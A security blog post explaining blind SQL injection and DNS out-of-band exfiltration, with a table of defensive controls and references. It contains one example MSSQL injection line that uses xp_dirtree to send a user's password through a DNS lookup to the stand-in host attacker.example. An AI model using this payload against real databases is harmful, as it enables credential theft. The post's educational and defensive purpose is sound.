---
title: "Blind SQL Injection and Out-of-Band Exfiltration: DNS as a Covert Channel"
date: 2026-06-30 11:45:00 +0300
categories: [Security Research]
tags: [sqli, oob, dns-exfiltration, web-security]
pin: false
---

## Summary

**Blind SQL injection** occurs when an application is vulnerable to SQLi but does not reflect query results in the HTTP response. Attackers infer success through boolean timing, error side channels, or **out-of-band (OOB)** callbacks. [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) documents these variants. This article focuses on **DNS-based OOB exfiltration**—a technique referenced in [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band) labs and observed in real penetration tests when HTTP egress is filtered but DNS is not.

## When OOB exfiltration applies

Blind boolean/timing attacks work but scale poorly for extracting large strings (e.g., `password` columns). OOB techniques trigger the database to **initiate a network request** to an attacker-controlled server:

- **Microsoft SQL Server** — `xp_dirtree`, `xp_fileexist`, or `OPENROWSET` patterns (environment-dependent).
- **Oracle** — `UTL_HTTP` or `DNS` packages (often restricted).
- **MySQL** — `LOAD_FILE()` with UNC paths on Windows historically; **`LOAD DATA`** restrictions vary.

PortSwigger's OOB lab uses **`xp_dirtree`** to force a DNS lookup to Burp Collaborator—demonstrating the **meta-principle**: if the DBMS can resolve attacker-controlled hostnames, data can be encoded in subdomains.

## Example pattern (conceptual, MSSQL)

An attacker might inject (simplified for education):

```sql
'; EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.example\share';--
```

If successful, the server performs a DNS lookup for `<data>.attacker.example`, visible in the attacker's DNS logs or Collaborator.

**Encoding constraints:** DNS labels are limited to **63 octets**; charset restrictions mean hex/base32 encoding is common in tools like **sqlmap** (`--dns-domain`).

## Defensive controls

| Control | Mechanism |
| ------- | --------- |
| Parameterized queries | Removes injection class at source |
| Egress filtering | Block DB servers from arbitrary DNS/HTTP except allow-listed destinations |
| Privilege reduction | Disable `xp_*` extended procedures not required |
| Monitoring | Alert on anomalous DNS from database subnet |

[CWE-89](https://cwe.mitre.org/data/definitions/89.html) (SQL Injection) remains on the [MITRE CWE Top 25](https://cwe.mitre.org/top25/) for good reason—OOB is an exfiltration *technique*, not a separate root cause.

## References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger — Blind SQLi with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
- [sqlmap DNS exfiltration documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage#dns-domain-exfiltration)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
